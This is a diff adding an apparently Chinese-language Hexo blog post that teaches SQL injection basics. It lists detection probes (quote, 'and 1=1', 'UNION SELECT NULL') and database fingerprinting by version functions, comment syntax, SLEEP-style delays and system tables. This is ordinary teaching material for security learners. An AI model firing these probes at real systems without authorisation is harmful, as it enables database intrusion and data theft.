@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="认识SQL注入一、什么是SQL注入？SQL注入其实是一个组合名词，SQL、注入，想理解SQL注入的含义，就应该先明白SQL是什么？注入是什么？ SQL是什么？SQL是结构化查询语言(Structured Query Language)的简称，一种用于管理和操作关系型数据库的标准语言。通俗的讲，是一种可以在电子表格里进行想要的筛选、操作和管理数据的一种标准语言。 注入是什么？注入（Injection">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入由浅至深解析">
+<meta property="og:url" content="https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/index.html">
+<meta property="og:site_name" content="M3ng9e&#39;Log">
+<meta property="og:description" content="认识SQL注入一、什么是SQL注入？SQL注入其实是一个组合名词，SQL、注入，想理解SQL注入的含义，就应该先明白SQL是什么？注入是什么？ SQL是什么？SQL是结构化查询语言(Structured Query Language)的简称，一种用于管理和操作关系型数据库的标准语言。通俗的讲，是一种可以在电子表格里进行想要的筛选、操作和管理数据的一种标准语言。 注入是什么？注入（Injection">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://menge-bucket.oss-cn-beijing.aliyuncs.com/blog/sql-injection.svg">
+<meta property="og:image" content="c:\Users\15191\AppData\Roaming\Typora\typora-user-images\image-20250309165506803.png">
+<meta property="og:image" content="https://menge-bucket.oss-cn-beijing.aliyuncs.com/blog/image-20250312163604376.png">
+<meta property="og:image" content="https://menge-bucket.oss-cn-beijing.aliyuncs.com/blog/image-20250312162338599.png">
+<meta property="article:published_time" content="2025-03-07T09:56:42.000Z">
+<meta property="article:modified_time" content="2025-03-15T07:50:05.810Z">
+<meta property="article:author" content="M3ng9e">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://menge-bucket.oss-cn-beijing.aliyuncs.com/blog/sql-injection.svg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>SQL注入由浅至深解析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/02/26/hello-world/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&text=SQL注入由浅至深解析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&title=SQL注入由浅至深解析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&is_video=false&description=SQL注入由浅至深解析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SQL注入由浅至深解析&body=Check out this article: https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&title=SQL注入由浅至深解析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&title=SQL注入由浅至深解析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&title=SQL注入由浅至深解析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&title=SQL注入由浅至深解析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&name=SQL注入由浅至深解析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://m3ng9e.github.io/2025/03/07/SQL%E6%B3%A8%E5%85%A5%E7%94%B1%E6%B5%85%E8%87%B3%E6%B7%B1%E8%A7%A3%E6%9E%90/&t=SQL注入由浅至深解析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%A4%E8%AF%86SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">认识SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">一、什么是SQL注入？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.1.1.</span> <span class="toc-text">SQL是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.1.2.</span> <span class="toc-text">注入是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.1.3.</span> <span class="toc-text">SQL注入漏洞是什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%8F%E5%85%B8%E6%A1%88%E4%BE%8B"><span class="toc-number">1.2.</span> <span class="toc-text">二、SQL注入的经典案例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.3.</span> <span class="toc-text">三、SQL注入的危害</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">SQL注入基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81SQL%E5%9F%BA%E7%A1%80"><span class="toc-number">2.1.</span> <span class="toc-text">一、SQL基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">二、如何检测SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%9F%A5%E6%89%BE%E4%B8%8D%E5%90%8C%E4%BD%8D%E7%BD%AE%E7%9A%84SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.</span> <span class="toc-text">三、查找不同位置的SQL注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">发现SQL注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">SQL注入的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.1.</span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E9%97%AD%E5%90%88%E7%A1%AE%E5%AE%9A%E4%BA%86%E5%AD%97%E6%AE%B5%E6%95%B0%EF%BC%8C%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E4%BB%80%E4%B9%88%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%A2%EF%BC%9F"><span class="toc-number">4.2.</span> <span class="toc-text">找到闭合确定了字段数，如何判断是什么数据库呢？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%A7%82%E5%AF%9F%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF"><span class="toc-number">4.2.1.</span> <span class="toc-text">1. 观察报错信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%80%9A%E8%BF%87%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E5%AE%9A%E8%AF%AD%E6%B3%95%E6%B5%8B%E8%AF%95"><span class="toc-number">4.2.2.</span> <span class="toc-text">2. 通过数据库特定语法测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E-UNION-SELECT-%E8%AF%AD%E6%B3%95"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">基于 UNION SELECT 语法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%A7%82%E5%AF%9F%E6%B3%A8%E9%87%8A%E9%A3%8E%E6%A0%BC"><span class="toc-number">4.2.3.</span> <span class="toc-text">3. 观察注释风格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%80%9A%E8%BF%87-ORDER-BY-%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">4.2.4.</span> <span class="toc-text">4. 通过 ORDER BY 测试数据类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%88%A9%E7%94%A8%E6%97%B6%E9%92%9F%E5%BB%B6%E8%BF%9F%E6%B5%8B%E8%AF%95%EF%BC%88%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="toc-number">4.2.5.</span> <span class="toc-text">5. 利用时钟延迟测试（盲注）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%A7%82%E5%AF%9F%E9%BB%98%E8%AE%A4%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8"><span class="toc-number">4.2.6.</span> <span class="toc-text">6. 观察默认数据库表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%A7%82%E5%AF%9F%E6%95%B0%E6%8D%AE%E5%87%BD%E6%95%B0"><span class="toc-number">4.2.7.</span> <span class="toc-text">7. 观察数据函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">SQL注入的绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">6.</span> <span class="toc-text">SQL注入的防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA"><span class="toc-number">7.</span> <span class="toc-text">SQL注入靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab1"><span class="toc-number">7.1.</span> <span class="toc-text">Lab1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab2"><span class="toc-number">7.2.</span> <span class="toc-text">Lab2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab3"><span class="toc-number">7.3.</span> <span class="toc-text">Lab3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab4"><span class="toc-number">7.4.</span> <span class="toc-text">Lab4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab5"><span class="toc-number">7.5.</span> <span class="toc-text">Lab5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab6"><span class="toc-number">7.6.</span> <span class="toc-text">Lab6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab7"><span class="toc-number">7.7.</span> <span class="toc-text">Lab7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab8"><span class="toc-number">7.8.</span> <span class="toc-text">Lab8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab9"><span class="toc-number">7.9.</span> <span class="toc-text">Lab9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab10"><span class="toc-number">7.10.</span> <span class="toc-text">Lab10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab11"><span class="toc-number">7.11.</span> <span class="toc-text">Lab11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab12"><span class="toc-number">7.12.</span> <span class="toc-text">Lab12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab13"><span class="toc-number">7.13.</span> <span class="toc-text">Lab13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab14"><span class="toc-number">7.14.</span> <span class="toc-text">Lab14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab15"><span class="toc-number">7.15.</span> <span class="toc-text">Lab15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lab16"><span class="toc-number">7.16.</span> <span class="toc-text">lab16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab17"><span class="toc-number">7.17.</span> <span class="toc-text">Lab17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab18"><span class="toc-number">7.18.</span> <span class="toc-text">Lab18</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        SQL注入由浅至深解析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">M3ng9e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-07T09:56:42.000Z" class="dt-published" itemprop="datePublished">2025-03-07</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="认识SQL注入"><a href="#认识SQL注入" class="headerlink" title="认识SQL注入"></a>认识SQL注入</h1><h2 id="一、什么是SQL注入？"><a href="#一、什么是SQL注入？" class="headerlink" title="一、什么是SQL注入？"></a>一、什么是SQL注入？</h2><p>SQL注入其实是一个组合名词，SQL、注入，想理解SQL注入的含义，就应该先明白SQL是什么？注入是什么？</p>
+<h3 id="SQL是什么？"><a href="#SQL是什么？" class="headerlink" title="SQL是什么？"></a>SQL是什么？</h3><p>SQL是结构化查询语言(Structured Query Language)的简称，一种用于管理和操作<strong>关系型数据库</strong>的标准语言。通俗的讲，是一种可以在电子表格里进行想要的<strong>筛选、操作和管理数据</strong>的一种标准语言。</p>
+<h3 id="注入是什么？"><a href="#注入是什么？" class="headerlink" title="注入是什么？"></a>注入是什么？</h3><p>注入（Injection） 在安全领域指的是将恶意代码或数据插入到原本的程序逻辑中，导致意想不到的行为，叫做<strong>注入攻击</strong>。通俗的讲，想象医生给你注射了毒素，导致破坏了你人体系统的平衡。</p>
+<h3 id="SQL注入漏洞是什么？"><a href="#SQL注入漏洞是什么？" class="headerlink" title="SQL注入漏洞是什么？"></a>SQL注入漏洞是什么？</h3><p>知道了什么是SQL，什么是注入，就容易理解SQL注入了。SQL注入漏洞就是通过注入攻击破坏了原有的SQL逻辑，导致攻击者可以实现对数据库的非法操作。</p>
+<h2 id="二、SQL注入的经典案例"><a href="#二、SQL注入的经典案例" class="headerlink" title="二、SQL注入的经典案例"></a>二、SQL注入的经典案例</h2><p>1998年，首个公开披露的SQL注入案例出现在<a target="_blank" rel="noopener" href="https://phrack.org/issues/54/8">Phrack杂志</a>，攻击者通过拼接单引号突破查询逻辑。</p>
+<p>通过一个简单的案例来简单理解SQL注入，下面这张图来自于一个很好的<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">学习资源网站</a>，讲的是网站具有查询产品的类别的功能，可以控制参数，恶意的hacker在原有的数据库逻辑上进行了联合查询，得到了所有的users表的账号和密码。</p>
+<img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/blog/sql-injection.svg" alt="SQL injection" style="zoom: 80%;" />
+
+<h2 id="三、SQL注入的危害"><a href="#三、SQL注入的危害" class="headerlink" title="三、SQL注入的危害"></a>三、SQL注入的危害</h2><p>简单认识了SQL注入，那么SQL注入到底能形成什么危害？</p>
+<p>SQL注入能造成的危害是发散的，例如颠覆逻辑，导致任意用户登录，或是对数据库进行控制，泄露所有信息或者被删库，也可以利用数据库权限植入后门等等等等，需要经过具体情况具体分析，总体来说SQL注入漏洞的危害是非常之高的。</p>
+<h1 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h1><h2 id="一、SQL基础"><a href="#一、SQL基础" class="headerlink" title="一、SQL基础"></a>一、SQL基础</h2><h2 id="二、如何检测SQL注入"><a href="#二、如何检测SQL注入" class="headerlink" title="二、如何检测SQL注入"></a>二、如何检测SQL注入</h2><p>通常在参数后加一个单引号查找错误和异常，再加入布尔条件and 1&#x3D;1 and 1&#x3D;2寻找差异，或者时间延迟寻找差异。</p>
+<h2 id="三、查找不同位置的SQL注入"><a href="#三、查找不同位置的SQL注入" class="headerlink" title="三、查找不同位置的SQL注入"></a>三、查找不同位置的SQL注入</h2><p>大多数SQL注入漏洞出现在Where子句后，SQL注入也经常出现再一些不同的位置</p>
+<ul>
+<li>update语句 更新的值或者where子句中</li>
+<li>insert语句  插入的值中</li>
+<li>select语句 表名或者列名中以及order by 语句</li>
+</ul>
+<h1 id="发现SQL注入"><a href="#发现SQL注入" class="headerlink" title="发现SQL注入"></a>发现SQL注入</h1><h1 id="SQL注入的利用"><a href="#SQL注入的利用" class="headerlink" title="SQL注入的利用"></a>SQL注入的利用</h1><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>所有数据库都需要判断字段类型，无论是什么数据库，判断字段类型的方法基本相同：</p>
+<ol>
+<li><p><strong>使用 <code>NULL</code> 测试</strong>：</p>
+<ul>
+<li><p><code>NULL</code> 可以匹配任何类型。</p>
+</li>
+<li><p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT NULL, NULL, NULL</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong>逐步替换 <code>NULL</code></strong>：</p>
+<ul>
+<li><p>将 <code>NULL</code> 替换为数字或字符，观察是否报错。</p>
+</li>
+<li><p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT 1, &#x27;a&#x27;, NULL</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong>通过错误信息判断</strong>：</p>
+<ul>
+<li>如果字段类型不匹配，数据库会返回明确的错误信息。</li>
+</ul>
+</li>
+</ol>
+<h2 id="找到闭合确定了字段数，如何判断是什么数据库呢？"><a href="#找到闭合确定了字段数，如何判断是什么数据库呢？" class="headerlink" title="找到闭合确定了字段数，如何判断是什么数据库呢？"></a>找到闭合确定了字段数，如何判断是什么数据库呢？</h2><h3 id="1-观察报错信息"><a href="#1-观察报错信息" class="headerlink" title="1. 观察报错信息"></a><strong>1. 观察报错信息</strong></h3><p>如果页面返回错误信息，可以从中提取数据库的类型信息。例如：</p>
+<ul>
+<li><strong>MySQL:</strong> <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version</code></li>
+<li><strong>MSSQL:</strong> <code>Unclosed quotation mark after the character string</code> 或 <code>Incorrect syntax near</code></li>
+<li><strong>PostgreSQL:</strong> <code>ERROR: syntax error at or near</code></li>
+<li><strong>Oracle:</strong> <code>ORA-00933: SQL command not properly ended</code></li>
+</ul>
+<p>如果错误信息中包含这些关键字，就能初步判断数据库类型。</p>
+<hr>
+<h3 id="2-通过数据库特定语法测试"><a href="#2-通过数据库特定语法测试" class="headerlink" title="2. 通过数据库特定语法测试"></a><strong>2. 通过数据库特定语法测试</strong></h3><p>不同数据库的 SQL 语法有所不同，可以尝试执行特定查询语句来判断数据库类型：</p>
+<h4 id="基于-UNION-SELECT-语法"><a href="#基于-UNION-SELECT-语法" class="headerlink" title="基于 UNION SELECT 语法"></a><strong>基于 <code>UNION SELECT</code> 语法</strong></h4><ul>
+<li><strong>MySQL:</strong> <code>SELECT 1,2,3 UNION SELECT @@version, user(), database();</code></li>
+<li><strong>MSSQL:</strong> <code>SELECT 1,2,3 UNION SELECT @@version, SYSTEM_USER, DB_NAME();</code></li>
+<li><strong>PostgreSQL:</strong> <code>SELECT 1,2,3 UNION SELECT version(), current_user, current_database();</code></li>
+<li><strong>Oracle:</strong> <code>SELECT 1,2,3 FROM dual UNION SELECT banner, user, ora_database_name FROM v$version;</code></li>
+</ul>
+<p>如果某个查询执行成功或返回版本信息，则可确定数据库类型。</p>
+<hr>
+<h3 id="3-观察注释风格"><a href="#3-观察注释风格" class="headerlink" title="3. 观察注释风格"></a><strong>3. 观察注释风格</strong></h3><p>不同数据库支持的 SQL 注释方式不同，可以利用这一特性：</p>
+<ul>
+<li><strong>MySQL:</strong> <code>-- </code>（两个 <code>-</code> 后加一个空格） 或 <code>#</code></li>
+<li><strong>MSSQL:</strong> <code>--</code>（两个 <code>-</code>，不需要空格） 或 <code>/* ... */</code></li>
+<li><strong>PostgreSQL:</strong> <code>-- </code>（两个 <code>-</code> 后加空格） 或 <code>/* ... */</code></li>
+<li><strong>Oracle:</strong> <code>-- </code>（两个 <code>-</code> 后加空格） 或 <code>/* ... */</code></li>
+</ul>
+<p>你可以在 SQL 注入测试时尝试不同的注释方式，看哪种不会报错，从而判断数据库类型。</p>
+<hr>
+<h3 id="4-通过-ORDER-BY-测试数据类型"><a href="#4-通过-ORDER-BY-测试数据类型" class="headerlink" title="4. 通过 ORDER BY 测试数据类型"></a><strong>4. 通过 <code>ORDER BY</code> 测试数据类型</strong></h3><p>不同数据库对 <code>ORDER BY</code> 处理方式不同：</p>
+<ul>
+<li><strong>MySQL &amp; PostgreSQL:</strong> 可以使用列的索引（如 <code>ORDER BY 1</code>）</li>
+<li><strong>MSSQL:</strong> 可能对 <code>ORDER BY 1</code> 报错，但 <code>ORDER BY column_name</code> 可用</li>
+<li><strong>Oracle:</strong> <code>ORDER BY 1</code> 可能报错，需使用 <code>ORDER BY column_name</code></li>
+</ul>
+<p>如果 <code>ORDER BY 1</code> 报错，而 <code>ORDER BY column_name</code> 可用，可能是 MSSQL 或 Oracle。</p>
+<hr>
+<h3 id="5-利用时钟延迟测试（盲注）"><a href="#5-利用时钟延迟测试（盲注）" class="headerlink" title="5. 利用时钟延迟测试（盲注）"></a><strong>5. 利用时钟延迟测试（盲注）</strong></h3><p>不同数据库有不同的延迟查询方法：</p>
+<ul>
+<li><strong>MySQL:</strong> <code>SELECT SLEEP(5);</code></li>
+<li><strong>MSSQL:</strong> <code>WAITFOR DELAY &#39;00:00:05&#39;;</code></li>
+<li><strong>PostgreSQL:</strong> <code>SELECT pg_sleep(5);</code></li>
+<li><strong>Oracle:</strong> <code>dbms_pipe.receive_message(&#39;A&#39;,5);</code></li>
+</ul>
+<p>如果某个查询执行后页面延迟响应，就可以确认数据库类型。</p>
+<hr>
+<h3 id="6-观察默认数据库表"><a href="#6-观察默认数据库表" class="headerlink" title="6. 观察默认数据库表"></a><strong>6. 观察默认数据库表</strong></h3><p>不同数据库有自己的系统表，可以通过 SQL 语句查看：</p>
+<ul>
+<li><strong>MySQL:</strong> <code>SELECT * FROM information_schema.tables;</code></li>
+<li><strong>MSSQL:</strong> <code>SELECT * FROM sys.tables;</code></li>
+<li><strong>PostgreSQL:</strong> <code>SELECT * FROM pg_catalog.pg_tables;</code></li>
+<li><strong>Oracle:</strong> <code>SELECT * FROM all_tables;</code></li>
+</ul>
+<p>如果查询某个表成功，则可确认数据库类型。</p>
+<hr>
+<h3 id="7-观察数据函数"><a href="#7-观察数据函数" class="headerlink" title="7. 观察数据函数"></a><strong>7. 观察数据函数</strong></h3><p>不同数据库提供的函数不同，可以利用这一点：</p>
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>版本查询函数</th>
+<th>用户查询函数</th>
+<th>数据库查询函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MySQL</td>
+<td><code>@@version</code></td>
+<td><code>user()</code></td>
+<td><code>database()</code></td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td><code>@@version</code></td>
+<td><code>SYSTEM_USER</code></td>
+<td><code>DB_NAME()</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>version()</code></td>
+<td><code>current_user</code></td>
+<td><code>current_database()</code></td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>banner</code> (v$version)</td>
+<td><code>user</code></td>
+<td><code>ora_database_name</code></td>
+</tr>
+</tbody></table>
